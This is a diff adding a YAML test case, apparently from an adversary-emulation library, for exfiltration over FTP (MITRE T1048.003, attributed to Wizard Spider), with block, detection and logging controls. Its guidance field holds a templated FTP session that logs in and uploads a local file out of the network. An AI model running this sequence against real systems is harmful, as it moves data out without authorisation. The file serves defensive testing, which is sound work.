@@ -1,0 +1,27 @@
+name: Exfiltration over FTP
+description: Exfiltrate data from the internal network to an external system via FTP
+metadata:
+  isv: 1
+  tactic: TA0010
+  tid: T1048.003
+  x_vectr_id: 34aabb0b-62b9-416e-b2fb-2633208c90fc
+  groups:
+  - Wizard Spider
+guidance:
+- "ftp> \nUSER {{ user }}\nPASS {{ password }}\nOPTS utf8 on\nPWD\nTYPE I\nPASV\n\
+  STORE {{ local_file }} {{ dest_name }}\nPASV\nSTORE {{ local_file }} {{ dest_name\
+  \ }}\n"
+block:
+- Connections to known malicious domains/IPs are blocked
+- If there is no business justification, block outbound FTP communications
+detect:
+- Network-based DLP detects sensitive data egressing the network
+- Connections with suspicious characteristics (e.g. first seen in environment, low
+  domain age, weak/unknown reputation, bad/unknown categorization) generate alerts
+  in the SIEM or network security controls
+logs:
+- network
+controls:
+- DLP
+- Firewall
+- SIEM
